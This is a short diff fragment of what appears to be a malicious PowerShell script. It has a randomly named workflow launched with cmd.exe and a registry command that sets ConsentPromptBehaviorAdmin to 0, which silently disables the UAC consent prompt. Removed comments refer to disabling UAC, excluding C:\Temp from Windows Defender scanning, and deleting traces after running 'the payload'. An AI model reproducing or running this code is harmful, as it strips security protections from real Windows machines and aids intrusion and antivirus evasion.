@@ -40,12 +40,5 @@ workflow gXJqIeQLEx{
 		}
 	}
 	Set-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -Value 00000000
-
+}
 gXJqIeQLEx 'cmd.exe'
-
-# disable UACMOM
-
-# This command adds the folder C:\Temp to the exclusion list.\n
-# The command disables Windows Defender scheduled and real-time scanning for files in this folder.
-
-#after finishing the payload we shall delete every     
